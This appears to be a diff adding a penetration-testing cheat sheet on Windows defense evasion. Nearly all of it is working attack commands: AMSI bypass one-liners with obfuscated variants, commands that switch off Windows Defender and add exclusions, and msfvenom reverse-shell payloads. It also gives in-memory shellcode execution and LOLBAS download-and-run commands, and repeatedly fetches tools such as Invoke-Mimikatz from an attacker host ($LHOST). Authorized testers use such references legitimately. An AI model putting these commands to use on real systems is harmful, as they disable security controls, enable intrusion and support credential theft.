@@ -1,0 +1,229 @@
+# Evasion — [Back to Main](README.md)
+
+Techniques for bypassing defenses on modern Windows. Ordered by reliability.
+
+> Most AMSI/AV signatures evolve rapidly. If a bypass is caught, try an obfuscated variant or different method.
+
+---
+
+## PowerShell Execution Policy Bypass
+
+Execution Policy is a preference, not a security boundary. Easy to bypass:
+
+```powershell
+# Inline bypass (no admin required)
+powershell -ExecutionPolicy Bypass -File script.ps1
+powershell -nop -exec bypass -File script.ps1
+
+# Run from memory — never writes script to disk (best approach)
+powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/script.ps1')"
+
+# Encode command (avoids quote escaping issues, basic obfuscation)
+$cmd = "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/script.ps1')"
+$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))
+powershell -nop -enc $enc
+
+# From cmd.exe
+powershell -nop -noni -w hidden -exec bypass -enc <base64>
+```
+
+---
+
+## AMSI Bypass
+
+AMSI (Antimalware Scan Interface) scans PowerShell input before execution. Must be bypassed before loading offensive tools.
+
+**Method 1 — PowerShell downgrade (most reliable)**
+```powershell
+# If PowerShell v2 is installed, AMSI doesn't exist in that version
+powershell.exe -version 2
+
+# Test if v2 is available:
+powershell -version 2 -Command '$PSVersionTable.PSVersion'
+
+# One-liner that downloads and runs script in v2 (no AMSI)
+powershell -version 2 -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/tool.ps1')"
+```
+
+**Method 2 — Memory field patch (run before loading tool)**
+```powershell
+# Classic (heavily signatured — use obfuscated version below)
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+# Obfuscated variant (change string concatenation to avoid detection)
+$x = [Ref].Assembly.GetType('System.Management.Automation.'+'AmsiUtils')
+$x.GetField('amsi'+'InitFailed','NonPublic,Static').SetValue($null,$true)
+```
+
+**Method 3 — Forced error via context pointer corruption**
+```powershell
+$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
+$b = $a.GetField('amsiContext',[Reflection.BindingFlags]'NonPublic,Static')
+$c = $b.GetValue($null)
+[System.Runtime.InteropServices.Marshal]::WriteInt32($c,0x41424344)
+```
+
+**Method 4 — Matt Graeber's minimal one-liner**
+```powershell
+[System.Net.ServicePointManager]::ServerCertificateValidationCallback={$true}; # also useful for self-signed certs
+# AMSI:
+[Runtime.InteropServices.Marshal]::WriteInt32([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiSession',[Reflection.BindingFlags]'NonPublic,Static').GetValue($null),0)
+```
+
+**After bypassing AMSI — load tools from memory:**
+```powershell
+# Load PowerSploit / PowerView / PowerUp without hitting disk
+IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/PowerView.ps1')
+IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/PowerUp.ps1')
+IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/Invoke-Mimikatz.ps1')
+```
+
+---
+
+## Constrained Language Mode (CLM) Bypass
+
+```powershell
+# Check
+$ExecutionContext.SessionState.LanguageMode
+# ConstrainedLanguage = restricted, FullLanguage = unrestricted
+
+# Bypass 1: PowerShell v2 (no CLM)
+powershell -version 2
+
+# Bypass 2: use a script block that runs before CLM is applied
+# (depends on AppLocker config — not always possible)
+
+# Bypass 3: find an unrestricted runspace in a running .NET app
+# PSBypassCLM tool — PT ONLY
+```
+
+---
+
+## Windows Defender
+
+**Disable (requires local admin):**
+```powershell
+# Disable real-time monitoring
+Set-MpPreference -DisableRealtimeMonitoring $true
+
+# Disable all protections
+Set-MpPreference -DisableRealtimeMonitoring $true -DisableBehaviorMonitoring $true -DisableBlockAtFirstSeen $true -DisableIOAVProtection $true
+
+# Add exclusion paths (survive reboots)
+Add-MpPreference -ExclusionPath "C:\Windows\Temp"
+Add-MpPreference -ExclusionPath "C:\Users\Public"
+Add-MpPreference -ExclusionProcess "powershell.exe"
+```
+
+**Without admin — minimize on-disk footprint:**
+```powershell
+# Load everything in memory — never write payload to disk
+# Use SMB share for tools instead of copying to target
+copy \\$LHOST\share\tool.exe .    # only if needed
+# Or use fileless execution (below)
+```
+
+---
+
+## Payload Obfuscation (msfvenom)
+
+```bash
+# Encoder stacking (limited effectiveness against modern AV)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
+  -e x64/xor_dynamic -i 5 -f exe -o shell_enc.exe
+
+# Shikata ga nai — x86 only
+msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
+  -e x86/shikata_ga_nai -i 10 -f exe -o shell_enc32.exe
+
+# Template injection (borrow legitimate binary's metadata/headers)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT \
+  -x /usr/share/windows-binaries/plink.exe -f exe -o shell_template.exe
+```
+
+> **Encoder-only evasion is largely ineffective against Defender in 2026.** In-memory execution and custom loaders are needed for real AV bypass.
+
+---
+
+## Fileless / In-Memory Execution
+
+```powershell
+# Download + execute shellcode in memory (no disk write)
+# Step 1: generate raw shellcode
+# msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f ps1 -v sc
+
+# Step 2: load and execute via VirtualAlloc + CreateThread
+$sc = [Convert]::FromBase64String('<base64_shellcode>')
+$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($sc.Length)
+[System.Runtime.InteropServices.Marshal]::Copy($sc, 0, $mem, $sc.Length)
+$thr = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
+  $mem, [System.Func[int]])
+$thr.Invoke()
+```
+
+**PT ONLY — tools with built-in evasion:**
+```bash
+# Villain — C2 framework, generates obfuscated payloads
+# Sliver — modern C2 with built-in AV evasion
+# Havoc — Cobalt Strike alternative
+```
+
+---
+
+## LOLBAS — AppLocker / Whitelisting Bypass
+
+Live-Off-the-Land binaries: signed Microsoft binaries that execute arbitrary code.
+
+```powershell
+# regsvr32 — downloads and executes SCT file, bypasses AppLocker
+regsvr32 /s /n /u /i:http://$LHOST:8000/payload.sct scrobj.dll
+
+# mshta — executes HTA files
+mshta http://$LHOST:8000/payload.hta
+mshta vbscript:Close(Execute("GetObject(""script:http://$LHOST/payload.sct"")"))
+
+# rundll32
+rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://$LHOST/payload.sct")
+
+# wscript / cscript (execute JS or VBS)
+wscript.exe \\$LHOST\share\payload.js
+cscript.exe \\$LHOST\share\payload.vbs
+
+# certutil — download (common)
+certutil.exe -urlcache -f http://$LHOST:8000/shell.exe C:\Windows\Temp\shell.exe
+
+# bitsadmin — download
+bitsadmin /transfer job http://$LHOST:8000/shell.exe C:\Windows\Temp\shell.exe
+
+# InstallUtil — execute .NET binary bypassing AppLocker
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\payload.exe
+```
+
+> Full reference: [lolbas-project.github.io](https://lolbas-project.github.io)
+
+---
+
+## Invoke-Obfuscation
+
+```powershell
+# Load the module (from memory or disk)
+IEX(New-Object Net.WebClient).DownloadString('http://$LHOST:8000/Invoke-Obfuscation.ps1')
+# or: Import-Module .\Invoke-Obfuscation.psd1
+
+Invoke-Obfuscation
+# Interactive — obfuscates a given command or script
+# TOKEN obfuscation is most reliable and hardest to detect
+```
+
+---
+
+## Useful Flags Summary
+
+```powershell
+powershell -nop                # -NoProfile
+powershell -noni               # -NonInteractive
+powershell -w hidden           # -WindowStyle Hidden
+powershell -exec bypass        # -ExecutionPolicy Bypass
+powershell -enc <base64>       # -EncodedCommand
+# Combine: powershell -nop -noni -w hidden -exec bypass -enc <b64>
+```
